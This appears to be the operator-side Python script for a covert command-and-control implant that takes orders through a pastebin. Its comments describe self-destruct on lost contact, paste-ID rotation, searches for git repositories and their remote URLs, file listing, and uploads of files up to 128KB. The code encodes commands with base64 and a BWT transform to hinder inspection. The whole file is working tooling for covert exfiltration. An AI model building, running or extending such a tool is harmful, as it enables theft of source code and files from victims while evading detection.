import base64
import sys

import argparse

import bwt

# # Command language details
# Pastebin unavailable 3 consecutive pulls in a row: self-destruct
# Path supports ~ expansion but not globbing
# Commands are line-delimited
# Obfuscate input with base64, which is easily decodable but which prevents visual inspection
# “url [slug]”: Replace URL paste ID with a new paste ID, at most once per command
# “find git [path]”: Searches for git repositories, and returns filesystem directories+remote URLs
# “list [path]”: Lists files at path
# “upload [path]”: Uploads file or directory, errors out if total upload would be over 128KB, at most once per command

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--new_url_slug", default=None)
    parser.add_argument("--file-list", action="append")
    parser.add_argument("--git-search", action="append")
    parser.add_argument("--upload", default=None, action="append")
    
    args_obj = parser.parse_args()
    cmd_actions = list()
    if args_obj.upload is not None:
        for fil in args_obj.upload:
            cmd_actions.append(f"upload {fil}")
    if args_obj.file_list is not None:
        for list_dir in args_obj.file_list:
            cmd_actions.append(f"list {list_dir}")
    if args_obj.git_search is not None:
        for git_search_dir in args_obj.git_search:
            cmd_actions.append(f"find git {git_search_dir}")
    if args_obj.new_url_slug is not None:
        cmd_actions.append(f"url {args_obj.new_url_slug}")
    
    if len(cmd_actions) == 0:
        print("Error: at least one action must be specified")
        sys.exit(1)

    print("Actions:")
    cmd_str = '\n'.join(cmd_actions)
    print(cmd_str)
    encoded_file = base64.b64encode(bytes(cmd_str, "utf8"))
    print("Copy the below text into the pastebin:")
    print(bwt.bwt(encoded_file.decode("ascii")))

if __name__ == "__main__":
    main()
